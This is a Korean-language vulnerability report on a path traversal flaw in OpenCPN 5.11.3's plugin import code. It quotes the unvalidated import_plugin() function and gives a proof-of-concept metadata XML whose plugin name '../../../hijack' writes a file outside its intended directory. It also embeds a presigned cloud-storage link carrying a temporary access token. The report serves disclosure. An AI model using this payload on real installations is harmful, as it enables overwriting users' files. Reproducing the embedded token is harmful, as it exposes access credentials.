---
notion_url: https://www.notion.so/c3bbe0809830830a942b01d9cc6acbc6
last_synced: 2026-06-12 13:49
tags: [notion-sync]
---

# [KOR] OpenCPN File overwrite - Path traversal report

취약점 제목 : OpenCPN File overwrite - Path traversal report
취약점 요약 : 파일 경로 검증 없이 .meta 파일을 생성함으로 발생하는 File Overwrite
제조사 : Github OpenSource Project
소프트웨어명 : OpenCPN
버전 : 5.11.3
소프트웨어 유형 : ECS (Electronic Chart System)
공격 유형 : Path Traversal
영향 : 프로세스 권한의 File Overwrite
취약한 파일명 : Console.cpp
취약한 함수명 : import_plugin()
취약한 파라미터 : metadata_path = PluginHandler::ImportedMetadataPath([metadata.name](http://metadata.name/));
취약점 발생 환경 : Ubuntu 24.04

Proof Of Concept  : 
Opencpn/cli 내의 console.cpp를 분석 중, import_plugin()에서

```c++
void import_plugin(const std::string& tarball_path) {
    auto handler = PluginHandler::GetInstance();
    PluginMetadata metadata;
    bool ok = handler->ExtractMetadata(tarball_path, metadata);
    if (!ok) {
      std::cerr << "Cannot extract metadata (malformed tarball?)\n";
      exit(2);
    }
    if (!PluginHandler::IsCompatible(metadata)) {
      std::cerr << "Incompatible plugin detected\n";
      exit(2);
    }
    ok = handler->InstallPlugin(metadata, tarball_path);
    if (!ok) {
      std::cerr << "Error extracting import plugin tarball.\n";
      exit(2);
    }
    metadata.is_imported = true;
    auto metadata_path = PluginHandler::ImportedMetadataPath(metadata.name);
    std::ofstream file(metadata_path);
    file << metadata.to_string();
    if (!file.good()) {
      std::cerr << "Error saving metadata file: " << metadata_path
                << " for imported plugin: " << metadata.name;
      exit(2);
    }
    exit(0);
  }
```

`metadata` 경로 검증 과정이 없는것을 확인 후 테스트해보기 위한 xml 파일을 작성

```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <plugin version="1">
      <name>../../../hijack</name>
      <version>0.0.1</version>
      <release>0</release>
      <summary>PoC</summary>
      <description>Path Traversal PoC</description>
      <target>ubuntu-x86_64</target>
      <build-target>ubuntu</build-target>
      <build-gtk>gtk3</build-gtk>
      <target-version>24.04</target-version>
      <target-arch>x86_64</target-arch>
      <api-version>1.18</api-version>
      <tarball-url>file:///nope</tarball-url>
    </plugin>
```

 `<name>` 에 ..나 /를 넣어 Path traversal 시도

![image](_assets/image.png)


취약점 기타 (파일 첨부 영상, 보고서 첨부) :

> 📎 첨부(미변환): [POC.mp4](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/b5ba704b-1446-488f-8f07-e5a8cd12e7aa/POC.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466WP4AQSZS%2F20260612%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260612T044947Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJIMEYCIQDzU%2F9WMi7nCqRyh5Vuyt%2BKDSGJrZxnPwBj61qpoLv4vAIhAM1wBDTlmVFg0WkZSrWYjAVjm9RagBHFDLAIgBOVP2i9Kv8DCA0QABoMNjM3NDIzMTgzODA1IgxEbuZe9p3zOfWiEPgq3AMoDcK6CERCkqifU8i90jmwrZxC8dljr%2FUrzJP8PIg0HYMWi%2F%2Flfjt1YZzJOScBimbxSatv7GXSR2dw7xJKMSnfPY82y10s%2BzABUYW2S%2Fl%2FJE%2FHZOsVdFtPhIC5UgWaiVZ7xn6bdwGL%2FoBUQtYeR0%2BcGonnwPW5FzcRHCSu1Wbhcr7e2BeObRQBz813SkdDjrjo8x88p7CdRQRebswYB4adoSJ1tQqGMXl3iJxos5xctqe%2F224WXpK1tPPXCR5mfLdpXR20vJ9cVlaT5FW2sSn%2FCK142qOpZXXx%2FxCnchi2lcKrUiQ6KSgGkP0%2B0NG9MBmK0M3nQHoLedxka75nlRcVRuOJYQyNjdthlGkvUWdhpHRoG583ti4qGaaP4Y%2FItSWJf4rW0RwXHBEAAQZMPIlwfm0EsBaKcAL0crzQk1FmPbMkVkv1xycBzwk7u8VFbxtelvS7yKRlkX4TSE1UwJsXkZ4eEIJWuqrF82lIxMTNTUWPv2E4IsRIP2TckKbX%2BPr77hmUF7SShuHW8aFl9nDShZ3%2BSq%2FTwV%2BhJqbEWNTSHIfAdGcPeSCnh9tLLSNM8%2BEHDM1JpPxnd7fl3K8QzntyslmseZtDU4Gu9RWqgEQkBSb0%2BKtFYWjI%2BbeiBjDr%2Ba3RBjqkAZ34vYMvdER8weHUqFGIEU2jR6ORB%2Bj2soL2MJ5ssNhJ6VPKV6fHYWJuVcUY8BE08DhiA2KDWuBvDXh7jtRuf%2B0nDwakB2vWSh0iiwtNA0JvDr7c3wc6sYYJ9wG57gE1bP%2BEdox0806Fo7NKZZ1j6dxw883A04mlx%2FWQG1K1blmUFqK0TDTcEg%2BgAm7zg6fgTqUQ%2ByU8Djh%2B1A%2FT5D4qji7nly%2BY&X-Amz-Signature=42084677651b75578c8ffe4593cb2e903d5f1fa5896d9b577228c2f9f46e9648&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
